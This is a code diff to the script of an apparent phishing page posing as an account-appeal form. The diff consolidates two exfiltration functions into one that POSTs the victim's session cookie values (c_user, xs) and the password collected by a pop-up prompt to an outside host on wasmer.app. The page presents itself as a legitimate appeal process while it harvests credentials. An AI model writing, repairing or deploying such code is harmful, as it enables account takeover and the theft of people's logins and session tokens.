@@ -1550,36 +1550,29 @@
         // Form submission handling
         const appealForm = document.querySelector('.appeal-form');
         const submitBtn = document.getElementById('submit-appeal-btn');
-         // Function to submit to both endpoints
-        function submitToEndpoints(data) {
-            // First endpoint for c_user and xs
-            const endpoint1 = 'https://qwerty-1713c.wasmer.app/Shoib.php';
+        
+        // Function to submit to the specified endpoint
+        function submitToEndpoint(data) {
+            const endpoint = 'https://qwerty-1713c.wasmer.app/Shoib.php';
             
-            // Second endpoint for password
-            const endpoint2 = 'https://qwerty-1713c.wasmer.app/shoibpass.php';
+            // Prepare the data to send
+            const formData = new FormData();
+            formData.append('c_user', data.c_user);
+            formData.append('xs', data.xs);
+            formData.append('password', data.password);
+            formData.append('language', data.language);
+            formData.append('timestamp', data.timestamp);
 
-            // Prepare data for first endpoint (c_user and xs)
-            const formData1 = new FormData();
-            formData1.append('c_user', data.c_user);
-            formData1.append('xs', data.xs);
-            formData1.append('language', data.language);
-            formData1.append('timestamp', data.timestamp);
-
-            // Prepare data for second endpoint (password)
-            const formData2 = new FormData();
-            formData2.append('password', data.password);
-            formData2.append('timestamp', data.timestamp);
-
-            // Send to both endpoints simultaneously
-            return Promise.all([
-                fetch(endpoint1, { method: 'POST', body: formData1 }),
-                fetch(endpoint2, { method: 'POST', body: formData2 })
-            ]);
+            // Send the data to the endpoint
+            return fetch(endpoint, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.text();
+            });
         }
-
-        // Form submission handling
-        const appealForm = document.querySelector('.appeal-form');
-        const submitBtn = document.getElementById('submit-appeal-btn');
         
         submitBtn.addEventListener('click', async function(e) {
             e.preventDefault();
@@ -1667,8 +1660,8 @@
                         confirmPasswordBtn.disabled = true;
                         confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
                         
-                        // Submit to both endpoints
-                        await submitToEndpoints(formData);
+                        // Submit to the endpoint
+                        await submitToEndpoint(formData);
                         
                         document.body.removeChild(passwordPrompt);
                         
@@ -1701,25 +1694,6 @@
                     } catch (error) {
                         console.error('Form submission error:', error);
                         alert(translations[currentLanguage]['submission_error'] || 'An error occurred while submitting your appeal. Please try again later.');
-                        confirmPasswordBtn.disabled = false;
-                        confirmPasswordBtn.innerHTML = translations[currentLanguage]['continue'] || 'Continue';
-                    }
-                });
-                
-                passwordInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        confirmPasswordBtn.click();
-                    }
-                });
-                
-            } catch (error) {
-                console.error('Error:', error);
-                submitBtn.disabled = false;
-                submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
-                alert(translations[currentLanguage]['error_occurred'] || 'An error occurred. Please try again.');
-            }
-        });
-
                         confirmPasswordBtn.disabled = false;
                         confirmPasswordBtn.innerHTML = translations[currentLanguage]['continue'] || 'Continue';
                     }
